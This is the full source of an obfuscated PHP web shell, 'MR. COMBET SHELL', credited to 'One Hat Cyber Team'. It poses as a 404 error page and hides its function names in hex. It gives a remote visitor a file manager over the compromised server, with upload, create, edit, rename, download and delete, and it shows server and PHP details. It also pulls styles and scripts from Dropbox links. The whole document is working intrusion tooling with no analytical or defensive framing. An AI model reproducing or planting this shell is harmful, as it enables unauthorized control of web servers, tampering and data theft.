<?php
error_reporting(0);
http_response_code(404);
define("Yp", "MR. COMBET SHELL");
$G3 = "scandir";
$c8 = [
    "7068705f756e616d65",
    "70687076657273696f6e",
    "676574637764",
    "6368646972",
    "707265675f73706c6974",
    "61727261795f64696666",
    "69735f646972",
    "69735f66696c65",
    "69735f7772697461626c65",
    "69735f7265616461626c65",
    "66696c6573697a65",
    "636f7079",
    "66696c655f657869737473",
    "66696c655f7075745f636f6e74656e7473",
    "66696c655f6765745f636f6e74656e7473",
    "6d6b646972",
    "72656e616d65",
    "737472746f74696d65",
    "68746d6c7370656369616c6368617273",
    "64617465",
    "66696c656d74696d65"
];
$lE = 0;
T4:
if (!($lE < count($c8))) {
    goto Je;
}
$c8[$lE] = JD($c8[$lE]);
Cy:
$lE++;
goto T4;
Je:
if (isset($_GET["p"])) {
    goto sr;
}
$Jd = $c8[2]();
goto VN;
sr:
$Jd = jD($_GET["p"]);
$c8[3](Jd($_GET["p"]));
VN:
function Ss($SP)
{
    $dE = "";
    $lE = 0;
    NZ:
    if (!($lE < strlen($SP))) {
        goto Xc;
    }
    $dE .= dechex(ord($SP[$lE]));
    WK:
    $lE++;
    goto NZ;
    Xc:
    return $dE;
}
function Jd($SP)
{
    $dE = "";
    $gf = strlen($SP) - 1;
    $lE = 0;
    Xp:
    if (!($lE < $gf)) {
        goto ur;
    }
    $dE .= chr(hexdec($SP[$lE] . $SP[$lE + 1]));
    Wn:
    $lE += 2;
    goto Xp;
    ur:
    return $dE;
}
function rn($F1)
{
    $Jd = fileperms($F1);
    if (($Jd & 0xc000) == 0xc000) {
        goto FZ;
    }
    if (($Jd & 0xa000) == 0xa000) {
        goto Eu;
    }
    if (($Jd & 0x8000) == 0x8000) {
        goto ES;
    }
    if (($Jd & 0x6000) == 0x6000) {
        goto sA;
    }
    if (($Jd & 0x4000) == 0x4000) {
        goto lG;
    }
    if (($Jd & 0x2000) == 0x2000) {
        goto tV;
    }
    if (($Jd & 0x1000) == 0x1000) {
        goto Tx;
    }
    $lE = "u";
    goto cC;
    FZ:
    $lE = "s";
    goto cC;
    Eu:
    $lE = "l";
    goto cC;
    ES:
    $lE = "-";
    goto cC;
    sA:
    $lE = "b";
    goto cC;
    lG:
    $lE = "d";
    goto cC;
    tV:
    $lE = "c";
    goto cC;
    Tx:
    $lE = "p";
    cC:
    $lE .= $Jd & 0x100 ? "r" : "-";
    $lE .= $Jd & 0x80 ? "w" : "-";
    $lE .= $Jd & 0x40 ? ($Jd & 0x800 ? "s" : "x") : ($Jd & 0x800 ? "S" : "-");
    $lE .= $Jd & 0x20 ? "r" : "-";
    $lE .= $Jd & 0x10 ? "w" : "-";
    $lE .= $Jd & 0x8 ? ($Jd & 0x400 ? "s" : "x") : ($Jd & 0x400 ? "S" : "-");
    $lE .= $Jd & 0x4 ? "r" : "-";
    $lE .= $Jd & 0x2 ? "w" : "-";
    $lE .= $Jd & 0x1 ? ($Jd & 0x200 ? "t" : "x") : ($Jd & 0x200 ? "T" : "-");
    return $lE;
}
function Xe($OB, $Ch = 1, $BL = "")
{
    global $Jd;
    $xe = $Ch == 1 ? "success" : "error";
    echo "<script>swal({title: \"{$xe}\", text: \"{$OB}\", icon: \"{$xe}\"}).then((btnClick) => {if(btnClick){document.location.href=\"?p=" .
        Ss($Jd) .
        $BL .
        "\"}})</script>";
}
function tF($yf)
{
    global $c8;
    if (!(trim(pathinfo($yf, PATHINFO_BASENAME), ".") === "")) {
        goto IE;
    }
    return;
    IE:
    if ($c8[6]($yf)) {
        goto PF;
    }
    unlink($yf);
    goto jK;
    PF:
    array_map(
        "deldir",
        glob($yf . DIRECTORY_SEPARATOR . "{,.}*", GLOB_BRACE | GLOB_NOSORT)
    );
    rmdir($yf);
    jK:
}
?>
<!doctype html>
<html lang="en">
<head>
    <meta name="theme-color" content="deeppink">
    <meta name="viewport" content="width=device-width, initial-scale=0.60, shrink-to-fit=no">
    <link rel="stylesheet" href="https://dl.dropboxusercontent.com/s/zws2dcs6cvcm214/style.css">
    <link rel="stylesheet" href="https://dl.dropboxusercontent.com/s/w33ev5mubuh8lb8/social-media.css">
    <link rel="stylesheet" href="https://dl.dropboxusercontent.com/s/jdw22um7yx56vh7/font.css">
    <link rel="stylesheet" href="https://dl.dropboxusercontent.com/s/2t4o2q8ygxtsh4j/table.css">
    <link href="https://fonts.googleapis.com/css2?family=Kelly+Slab&display=swap" rel="stylesheet">
    <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">
    <title>404 Not Found</title>
    <script src="https://dl.dropboxusercontent.com/s/5qkg1iiox054955/sweetalert.min.js"></script>
<style>
.d-flex {
    display: flex !important;
    justify-content: center;
    align-content: center;
    align-items: center;
}
.fa-fw {
width: 1.28571429em;
text-align: center;
color: lime;
}
</style>
<style>
body {
    margin: 0;
    font-family: 'Kelly Slab', cursive;
    font-weight: 400;
    line-height: 1.5;
    text-align: left;
    height: 100vh;
    margin-left: auto;
    margin-right: auto;
    width: 99%;
    font-size: 17px;
    background-color: black;
    color: white;
}
.border {
    border: 2px solid #ff1493;
    margin-top: 0.25rem !important;
    margin-bottom: 0.25rem !important;
}
.btn-outline-light {
    background: black;
    padding-left: 10px;
    padding-right: 10px;
    padding-top: 3px;
    padding-bottom: 3px;
    color: white;
    border: 2px solid #ff1493;
    border-radius: 5px;
    font-size: 17px;
    font-family: 'Kelly Slab', cursive;
}
.btn-outline-light:hover {
border: 2px solid #ff1493;
font-size: 17px;
color: lime;
}
input[type=file]:hover {
    color: lime;
}
input[type=submit] {
    background: black;
    color: white;
    border: 2px solid #ff1493;
    border-radius: 5px;
    font-size: 16px;
    font-family: 'Kelly Slab', cursive;
    padding-left: 10px;
    padding-right: 10px;
    padding-top: 3px;
    padding-bottom: 3px;
}
input[type=submit]:hover {
color: lime;
}
</style>
</head>
<body>
 <div class="border">
   <div class="d-flex">
  <a class="border social-icon" data-tooltip="Email" href="mailto:combetohct@yahoo.com">
    <i class="fa fa-envelope" aria-hidden="true" style="font-size: 17px;"></i>
  </a>&nbsp;
  <a class="border social-icon" data-tooltip="Facebook" href="https://www.facebook.com/combet.ohct">
    <i class="fa fa-facebook" aria-hidden="true" style="font-size: 17px;"></i>
  </a>&nbsp;
      <div class="combetohct">
       <a href="?" style="font-size:25px;font-family: 'SciFi';">
       <?= Yp ?>
       </a>&nbsp;
      </div>
         <a class="border social-icon" data-tooltip="WhatsApp" href="https://wa.me/6281270303335">
    <i class="fa fa-whatsapp" aria-hidden="true" style="font-size: 20px;"></i>
  </a>&nbsp;
  <a class="border social-icon" data-tooltip="Telegram" href="https://t.me/combetohct">
    <i class="fa fa-telegram" aria-hidden="true" style="font-size: 17px;"></i>
  </a>
  </div>
  </div>
 <div class="bg-dark border mt-2">
      <span class="mb-1 px-1 mt-1"><font color="white"> Your Ip : </font><font color="lime"><?php echo $_SERVER['REMOTE_ADDR']; ?></font></span><br>
   <span class="mb-1 px-1 mt-1"><font color="white"> Server Ip : </font><font color="lime"><?php echo $_SERVER['SERVER_ADDR']; ?></font></span><br>
   <span class="mb-1 px-1 mt-1"><font color="white"> Server : </font><font color="lime"><?= $c8[0]() ?></font></span><br>
   <span class="mb-1 px-1 mt-1"><font color="white"> Server Software : </font><font color="lime"><?php echo gethostbyname($_SERVER['SERVER_SOFTWARE']); ?></font></span><br>
   <span class="mb-1 px-1 mt-1"><font color="white"> Server Name : </font><font color="lime"><?php echo $_SERVER['SERVER_NAME']; ?></font></span><br>
   <span class="mb-1 px-1 mt-1"><font color="white"> PHP Version : </font><font color="lime"><?= $c8[1]() ?></font></span>
<div class="mb-1 px-1 mt-99">
  <font color="white"> Add File : </font>
       <a href="?p=<?= ss($Jd) . "&a=" . Ss("newFile") ?>" class="btn-outline-light"> Submit </a>
</div>
<div class="mb-1 px-1 mt-99">
   <font color="white"> Add Directory : </font>
       <a href="?p=<?= Ss($Jd) . "&a=" . sS("newDir") ?>" class="btn-outline-light"> Submit </a>
</div>
<div class="mb-1 px-1 mt-1">
    <form method="post" enctype="multipart/form-data"> 
       <input type='file' name='f[]'>
        <input type='submit' value='Upload' name='upload'>
        </form>
     </div>
    </form>
<?php
if (!isset($_FILES["f"])) {
    goto ea;
}
$Wx = $_FILES["f"]["name"];
$lE = 0;
th:
if (!($lE < count($Wx))) {
    goto dx;
}
if ($c8[11]($_FILES["f"]["tmp_name"][$lE], $Wx[$lE])) {
    goto PG;
}
Xe("file failed to upload", 0);
goto tG;
PG:
XE("");
tG:
g9:
$lE++;
goto th;
dx:
ea:
if (!isset($_GET["download"])) {
    goto FA;
}
header("Content-Type: application/octet-stream");
header("Content-Transfer-Encoding: Binary");
header("Content-Length: " . $c8[17](JD($_GET["n"])));
header("Content-disposition: attachment; filename=\"" . jd($_GET["n"]) . "\"");
FA:
?>
</div>
</div>
<div class="bg-dark border mt-2">
<div class="ml-99" style="font-size:17px;color:lime;">
<span style="color:white;">DIR : 
</span>
<?php
$Op = $c8[4]("/(\\\\|\\/)/", $Jd);
foreach ($Op as $j3 => $Oe) {
    if (!($j3 == 0 && $Oe == "")) {
        goto xi;
    }
    echo "<a href=\"?p=2f\">~</a>/";
    goto CS;
    xi:
    if (!($Oe == "")) {
        goto sq;
    }
    goto CS;
    sq:
    echo "<a href=\"?p=";
    $lE = 0;
    de:
    if (!($lE <= $j3)) {
        goto ie;
    }
    echo sS($Op[$lE]);
    if (!($lE != $j3)) {
        goto s0;
    }
    echo "2f";
    s0:
    dg:
    $lE++;
    goto de;
    ie:
    echo "\">{$Oe}</a>/";
    CS:
}
Go:
?>
</div>
</div>
<?php
if (!isset($_GET["a"])) {
    goto Un;
}
if (!isset($_GET["a"])) {
    goto cc;
}
$im = Jd($_GET["a"]);
cc:
?>
<?php
if (!($im == "delete")) {
    goto Lu;
}
$BL = $Jd . "/" . Jd($_GET["n"]);
if (!($_GET["t"] == "d")) {
    goto VZ;
}
TF($BL);
if (!$c8[12]($BL)) {
    goto e8;
}
Xe("", 0);
goto iL;
e8:
Xe("");
iL:
VZ:
if (!($_GET["t"] == "f")) {
    goto xB;
}
$BL = $Jd . "/" . jd($_GET["n"]);
unlink($BL);
if (!$c8[12]($BL)) {
    goto uH;
}
Xe("", 0);
goto Mk;
uH:
xe("");
Mk:
xB:
Lu:
?>
<?php
if ($im == "newDir") {
    goto Fg;
}
if ($im == "newFile") {
    goto Pb;
}
if ($im == "rename") {
    goto Lw;
}
if ($im == "edit") {
    goto Ox;
}
if ($im == "view") {
    goto Ag;
}
goto WC;
Fg:
?>
<div class="mt-2">New Folder :
</div>
<form method="post">
<div class="form-group mt-2">
<input name="n" id="n" class="form-control" style="border: 2px solid deeppink;" autocomplete="off">
</div>
<div class="form-group mt-2"><center>
<button type="submit" name="s" class="btn btn-outline-light">Create
</button></center>
</div>
</form>
<?php
isset($_POST["s"])
    ? ($c8[12]("{$Jd}/{$_POST["n"]}")
        ? xE("folder name has been used", 0, "&a=" . SS("newDir"))
        : ($c8[15]("{$Jd}/{$_POST["n"]}")
            ? Xe("")
            : Xe("folder failed to create", 0)))
    : null;
goto WC;
Pb:
?>
<div class="mt-2">New File :
</div>
<form method="post">
<div class="form-group mt-2">
<input type="text" name="n" id="n" class="form-control" style="border: 2px solid deeppink;" placeholder="">
</div>
<div class="form-group mt-2">
<textarea style="resize:none;border: 2px solid deeppink;" name="ctn" id="ctn" cols="30" rows="10" class="form-control" placeholder=""></textarea>
</div>
<div class="form-group mt-2">
<center><button type="submit" name="s" class="btn btn-outline-light">Create
</button></center>
</div>
</form>
<?php
isset($_POST["s"])
    ? ($c8[12]("{$Jd}/{$_POST["n"]}")
        ? xE("file name has been used", 0, "&a=" . SS("newFile"))
        : ($c8[13]("{$Jd}/{$_POST["n"]}", $_POST["ctn"])
            ? XE("", 1, "&a=" . ss("view") . "&n=" . Ss($_POST["n"]))
            : Xe("file failed to create", 0)))
    : null;
goto WC;
Lw:
?>
<div class="mt-2">Rename :
<?= $_GET["t"] == "d" ? "folder" : "file" ?>
</div>
<form method="post">
<div class="form-group mt-2">
<input type="text" name="n" id="n" class="form-control" style="border: 2px solid deeppink;" value="<?= jD(
    $_GET["n"]
) ?>">
</div>
<center><div class="form-group mt-2">
<button type="submit" name="s" class="btn btn-outline-light">Submit
</button>
</div></center>
</form>
<?php
isset($_POST["s"])
    ? ($c8[16]($Jd . "/" . jD($_GET["n"]), $_POST["n"])
        ? XE("")
        : Xe("failed to change the folder name", 0))
    : null;
goto WC;
Ox:
?>
<div class="border p-1 mt-2"><font color="lime">Edit File Name: </font><?= Jd(
    $_GET["n"]
) ?></div>
<form method="post">
<div class="form-group mt-2">
<textarea name="ctn" id="ctn" cols="30" rows="10" class="form-control" style="border: 2px solid deeppink;">
<?= $c8[18]($c8[14]($Jd . "/" . jD($_GET["n"]))) ?></textarea>
</div>
<center><div class="form-group mt-2">
<button type="submit" name="s" class="btn btn-outline-light">Submit
</button>
</div></center>
</form>
<?php
isset($_POST["s"])
    ? ($c8[13]($Jd . "/" . jD($_GET["n"]), $_POST["ctn"])
        ? xE("", 1, "&a=" . sS("view") . "&n={$_GET["n"]}")
        : xE("file contents failed to change"))
    : null;
goto WC;
Ag:
?>
<div class="border p-1 mt-2"><font color="lime">View File Name: </font><?= jd(
    $_GET["n"]
) ?></div>
<div class="form-group mt-2">
<textarea name="ctn" id="ctn" cols="30" rows="10" class="form-control" style="border: 2px solid deeppink;" readonly>
<?= $c8[18]($c8[14]($Jd . "/" . jd($_GET["n"]))) ?></textarea>
</div>
<?php WC: ?>
</div>
<?php
goto mR;
Un:
?>
<table class="combetohct mt-2">
<thead>
<tr>
<th>Name
</th>
<th>Size
</th>
<th>Permission
</th>
<th colspan="4">Action
</th>
</tr>
</thead>
<tbody>
          <?php
          $G3 = $c8[5]($G3($Jd), [".", ".."]);
          foreach ($G3 as $yf) {
              if ($c8[6]("{$Jd}/{$yf}")) {
                  goto CB;
              }
              goto Qj;
              CB:
              echo "<tr><td><a href=\"?p=" .
                  sS("{$Jd}/{$yf}") .
                  "\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"" . $c8[19]("Y-m-d H:i", $c8[20]("{$Jd}/{$yf}")) . "\"><div class=\"p\"><i class=\"fa fa-fw fa-folder\"> </i> {$yf}</a></div></td><td> - </td><td><font color=\"" .
                  ($c8[8]("{$Jd}/{$yf}")
                      ? "#00ff00"
                      : (!$c8[9]("{$Jd}/{$yf}")
                          ? "#00bfff"
                          : null)) .
                  "\">" .
                  RN("{$Jd}/{$yf}") .
                  "</font></td><td> - </td><td><div class=\"z\"><a href=\"?p=" .
                  ss($Jd) .
                  "&a=" .
                  ss("rename") .
                  "&n=" .
                  ss($yf) .
                  "&t=d\" data-toggle=\"tooltip\" data-placement=\"auto\">Rename</a></td><td> - </td><td><a href=\"?p=" .
                  sS($Jd) .
                  "&a=" .
                  ss("delete") .
                  "&n=" .
                  ss($yf) .
                  "\" class=\"delete\" data-type=\"folder\" data-toggle=\"tooltip\" data-placement=\"auto\"> Delete </a></td></tr>";
              Qj:
          }
          ad:
          foreach ($G3 as $F1) {
              if ($c8[7]("{$Jd}/{$F1}")) {
                  goto wA;
              }
              goto X1;
              wA:
              $kL = $c8[10]("{$Jd}/{$F1}") / 1024;
              $kL = round($kL, 3);
              $kL = $kL > 1024 ? round($kL / 1024, 2) . " MB" : $kL . " KB";
              echo "\n\t\t\t\t\t<tr>\n\t\t\t\t\t\t<td><a href=\"?p=" .
                  SS($Jd) .
                  "&a=" .
                  sS("view") .
                  "&n=" .
                  SS($F1) .
                  "\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"" . $c8[19]("Y-m-d H:i", $c8[20]("{$Jd}/{$yf}")) . "\"><div class=\"p\"><i class=\"fa fa-fw fa-file\"> </i> {$F1}</a></div></td><td>{$kL}</td><td><font color=\"" .
                  ($c8[8]("{$Jd}/{$F1}")
                      ? "#00ff00"
                      : (!$c8[9]("{$Jd}/{$F1}")
                          ? "#00bfff"
                          : null)) .
                  "\">" .
                  rN("{$Jd}/{$F1}") .
                  "</font></td><td><div class=\"z\"><a href=\"?p=" .
                  Ss($Jd) .
                  "&a=" .
                  Ss("edit") .
                  "&n=" .
                  SS($F1) .
                  "\" data-toggle=\"tooltip\" data-placement=\"auto\"> Edit </a></td><td><a href=\"?p=" .
                  ss($Jd) .
                  "&a=" .
                  SS("rename") .
                  "&n=" .
                  ss($F1) .
                  "&t=f\" data-toggle=\"tooltip\" data-placement=\"auto\"> Rename </a></td><td><a href=\"?p=" .
                  ss($Jd) .
                  "&n=" .
                  sS($F1) .
                  "&download" .
                  "\" data-toggle=\"tooltip\" data-placement=\"auto\"> Download </a></td><td><a href=\"?p=" .
                  ss($Jd) .
                  "&a=" .
                  sS("delete") .
                  "&n=" .
                  ss($F1) .
                  "\" class=\"delete\" data-type=\"file\" data-toggle=\"tooltip\" data-placement=\"auto\">Delete</a></div></td></tr>";
              X1:
          }
          a2:
          ?>
        </tbody>
      </table>
      <?php mR: ?>
<div style="text-align: center;"><br>
<font color="lime">Copyright  2022 </font> <font color="deeppink">Mr.Combet</font> <font color="lime">. Powered by</font> <font color="deeppink">One Hat Cyber Team</font>
</div></br>
    <script src="//code.jquery.com/jquery-3.5.1.slim.min.js">
    </script>
    <script src="//cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.bundle.min.js" >
    </script>
    <script src="//cdn.jsdelivr.net/npm/bs-custom-file-input/dist/bs-custom-file-input.min.js">
    </script>
    <script>eval(function(p,a,c,k,e,d){
        e=function(c){
          return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};
        if(!''.replace(/^/,String)){
          while(c--){
            d[e(c)]=k[c]||e(c)}
          k=[function(e){
            return d[e]}
            ];
          e=function(){
            return'\\w+'};
          c=1};
        while(c--){
          if(k[c]){
            p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}
        }
        return p}
                 ('E.n();$(\'[2-m="4"]\').4();$(".l").k(j(e){e.g();h 0=$(6).5("2-0");c({b:"a",9:"o i q?",w:"D "+0+" p C B",A:7,z:7,}).y((8)=>{r(8){x 1=$(6).5("3")+"&t="+((0=="v")?"d":"f");u.s.3=1}})});',41,41,'type|buildURL|data|href|tooltip|attr|this|true|willDelete|title|warning|icon|swal||||preventDefault|let|you|function|click|delete|toggle|init|Are|will|sure|if|location||document|folder|text|const|then|dangerMode|buttons|deleted|be|This|bsCustomFileInput'.split('|'),0,{
      }
                 ))</script>
  </body>
</html>